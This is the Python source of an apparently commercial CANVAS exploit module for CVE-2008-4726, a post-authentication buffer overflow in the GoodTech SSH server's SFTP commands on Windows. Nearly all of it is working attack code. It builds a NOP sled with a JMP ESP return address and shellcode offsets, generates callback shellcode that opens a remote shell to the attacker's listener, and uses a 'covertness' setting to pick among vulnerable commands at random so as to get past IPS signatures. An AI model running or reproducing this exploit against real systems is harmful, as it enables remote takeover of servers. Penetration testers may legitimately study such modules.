#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2005-2007
#http://www.immunityinc.com/CANVAS/ for more information

#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

import os
import getopt
import sys
import socket
import time
import struct

if '.' not in sys.path: sys.path.append('.')
sys.path.append('../../encoder')
sys.path.append('./encoder')
sys.path.append("../../shellcode")
sys.path.append("./shellcode")

import canvasengine
import shellcodeGenerator
import chunkedaddencoder
import win32shell
from tcpexploit import tcpexploit

from exploitutils import *
from tcpexploit import tcpexploit


import libs.paramiko as paramiko

NAME='Goodtech SSH overflow'
DESCRIPTION='Overflow on commands issued by authenticated users in the Goodtech SSH server'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Goodtech"
DOCUMENTATION['CVE Url']="http://cve.mitre.org/cgi-bin/cvename.cgi?name=2008-4726"
DOCUMENTATION['CVE Name']="CVE-2008-4726"
DOCUMENTATION['References']=''
DOCUMENTATION['CVSS'] = 9.0
DOCUMENTATION['Repeatability']='Infinite'
DOCUMENTATION["Notes"]="""
Buffer overflows exist in the following GoodTech SSH server commands:

['open','unlink','file','lstat','remove','get','put','listdir','listdir_attr']

At covertness 1 only 'open' is used, any covertness above 1 a random choice between all vulnerable functions
is used (this may be good for testing badly written IPS sigs that tune themselves on Milw0rm code.....)

These are post authentication so you need valid credentials to be able to exploit the system. By default
all windows user accounts are valid SSH user accounts also.

NOTE: As of 11/11/08 The currently available version of the GoodTech SSH server (6.40) was still vulnerable despite
this vulnerability and an exploit being public. The public exploit only exploited the vulnarable 'open' command 
and only worked against XP, not 2K and 2K3 like this exploit does.
"""
DOCUMENTATION["Commandline"]="Make sure you set up a Win32 mosdef listener"

VERSION='0.1'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','XP','2003']

NOTES=""" 
1. Bad username/pw combinations don't seem to be caught in the connect routines for some reason?
Not sure if this is Paramiko's bad or GoodTech's SSHD not given a correct return for invalid credentials
but it means we have to try and do a listdir and catch an error on that if our credentials were bad. It
sucks but that's how it is atm.

2. listdir and listdirattr are vulnerable but in a slightly different way so need to do more work on that
   if Goodtech ever fix this vuln then they may miss fixing those ?

3. The current version of the GoodTech SSHD that you can download from their website (6.40) was still vulnerable
as of 11/11/08, even though the sploit was release to milw0rm weeks before that ...... go figure.
"""

CHANGELOG="""
11/11/08 Version 1 of the exploi. Rich
"""

from threading import *
class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)        
        self.name=NAME
        self.port=22
        self.user='sshd'
        self.password='foobar'
        # chars to exclude in shellcode generation
        self.badstring = "%\x00\x0d"
        
        return

    def getArgs(self):
        self.host=self.target.interface
        self.getarg('user')
        self.getarg('password')
        self.port=int(self.argsDict.get('port',self.port))
        return
    
    
    def neededListenerTypes(self):
        
        return [canvasengine.WIN32MOSDEF]
    
    def connect_to_host(self):
        
        self.s=self.gettcpsock()
        try:
            self.log( "Connecting.....")
            self.s.connect((self.host,self.port))
            self.log( "Done")
        except socket.error:
            self.log("Cannot connect to target on port %d"%(self.port))
            return 0
        #paramiko.util.log_to_file('./para.logs')
        try:
            self.log("Setting up SSH transport")
            self.transport=paramiko.Transport(self.s)
        except Exception, err:
            #transport.close()
            self.log( "transport failed: %s"%(err))
            return 0
        
        try:
            self.log( "Authenticating (%s:%s)....."%(self.user, self.password))
            self.transport.connect(username=self.user,password=self.password)
            self.ssh_version=self.transport.remote_version
        except Exception, err:
            #transport.close()
            self.log("Bad username or password [%s:%s] - we suck: %s"%(self.user, self.password, err))
            return 0
        
        sftp_ch=paramiko.SFTPClient.from_transport(self.transport) 
        
        ##As either paramiko or goodtech are crappy and don't throw the correct errors when we have bad
        ## username or password we have to check like this ...... f&*^%& sucks
        try:
            content=sftp_ch.listdir(".")
        except IOError:
            ##We weren't autheticated after allll nice.
            self.log("Bad username or password [%s:%s] - we suck"%(self.user, self.password))
            self.transport.close()
            self.s.close()
            return 0
        
        self.log("Connected and authenticated to SSH session")
        return sftp_ch
    
    def choose_vulnerable_function(self):
        ##Higher convertness chooses between multiple vulnerable functions ..... (listdir, listdirattr) also vuln but in a diff way.
        vulnerable_functions=['open','unlink','file','lstat','remove','get','put','listdir','listdir_attr']
        
        ##Choose vuln func dependent on covertness
        if self.covertness == 1:
            ##always use open ala crappy public exploit
            vf='open'
        else:
            ##randomly choose a vulnerable func to abuse
            vf=randomlist(vulnerable_functions)
            
        self.log('Using vulnerable function: %s'%(vf))
        
        return vf
    
    def make_sploit(self):
        
        self.vf=self.choose_vulnerable_function()
        self.vf='listdir_attr'
        ##We gotta set the shellcode to be correct dependent on the vulnerable function
        if self.vf in ['listdir', 'listdir_attr']:
            eiploc=424
            shelloc=428
        else:
            ##Correct for all funcs other than listdir & listdirattr
            eiploc=164 
            shelloc=168
        
        ##Common to all
        eip=0x1006A91E #JMP ESP in sshd.exe
        ret="\x90"*1000 ##Dirty, should randomise the nopsleds
        
        ret=stroverwrite(ret,intel_order(eip),eiploc)
        ret=stroverwrite(ret,self.shellcode,shelloc)
        
        return ret

    def createShellcode(self):
        
        self.remoteport=self.callback.port
        self.shellcode=self.createWin32Shellcode(self.badstring, self.callback.ip, self.callback.port)
        return self.shellcode

    def send_attack(self, sftp_ch, atk_str):
        
        try:
            atk_ch=getattr(sftp_ch, self.vf)
            
            if self.vf=='put':
                ##put needs a valid local filename as an extra arg
                localfilename="fortunes.txt"
                atk_ch(localfilename, atk_str)
            
            elif self.vf=='get':
                ##get needs a value for local filename as an extra arg
                atk_ch(atk_str,"foobar")
                
            elif self.vf in ['listdir', 'listdir_attr']:
                ##These funcs are different as paramiko waits for a return on them, we obviously we don't get
                ## as we have the process, so let set the socket to be non-blocking so it returns :)
                s=sftp_ch.get_channel()
                s.settimeout(0.0)
                try:
                    atk_ch(atk_str)
                except socket.timeout:
                    print "caught timeout"
                
            else:
                ##all other funcs just need a overlong path
                atk_ch(atk_str)
            
        except IOError:
            print "err"
            pass
        
        ##Close the connection ?
    
    def test(self):
        self.getArgs()
        self.log('%s testing %s:%s - running'%(NAME,self.host,self.port))
        self.setInfo('%s testing %s:%s - running'%(NAME,self.host,self.port))
        
        s = self.connect_to_host()
        if s == 0:
            return 0
        else:
            self.transport.close()
            ##ATM can't find a way to get the server banner out of paramiko .... strange. Anyway we will have to settle for this atm
            if self.ssh_version == "SSH-2.0-cryptlib":
                self.log("Looks like a Goodtech SSH server")
                return 1
            else:
                self.log("Doesn't look like a Goodtech SSH server")
                return 0
                
    def run(self):
        self.getArgs()

        self.log('%s running against %s:%d covertness: %d'%(NAME,self.host,self.port,self.covertness))
        self.setInfo('%s attacking %s:%d (Covertness:%d) - running'%(NAME,self.host,self.port,self.covertness))
        self.log("GoodTech SSH buffer overflow user: %s password %s"%(self.user, self.password))
        
        ##Connect and establish SSH session
        sftp_conn=self.connect_to_host()
        
        if not sftp_conn:
            ##Connection failed
            self.s.close()
            self.setInfo("%s attacking %s:%d - done (failed!)"% (NAME, self.host, self.port))
            self.log("Could not connect to %s:%d"% (self.host, self.port))
            return 0
        
        ##Construct shellcode
        self.createShellcode()

        ##Construct attack string
        sploit_string=self.make_sploit()
        
        ##Send attack string
        self.send_attack(sftp_conn, sploit_string)
        
        self.log("Sleeping for 5 secs for shell to return ......")
        time.sleep(5)
        
        if self.ISucceeded():
            self.setInfo("%s attacking %s:%d - done (succeeded!)"% (NAME, self.host, self.port))
            self.log("Exploit SUCCEEDED.")
            ret=1
        else:
            self.setInfo("%s attacking %s:%d - done (failed!)"% (NAME, self.host, self.port))            
            self.log("Exploit FAILED.")
            ret=0
        
        self.cleanup()
        #self.transport.close()
        #self.s.close()
        #self.log("Exploit finished.")
        #self.setState("done")
        return ret
    
    def cleanup(self):
        self.transport.close()
        self.s.close()
        self.log("Exploit finished.")
        self.setState("done")

    def usage(self):
        print 'Usage: %s -t host -p port [-U user -P password] [-C covertness]'%(sys.argv[0])

if __name__=='__main__':
    app=theexploit()
    ret=standard_callback_commandline(app)
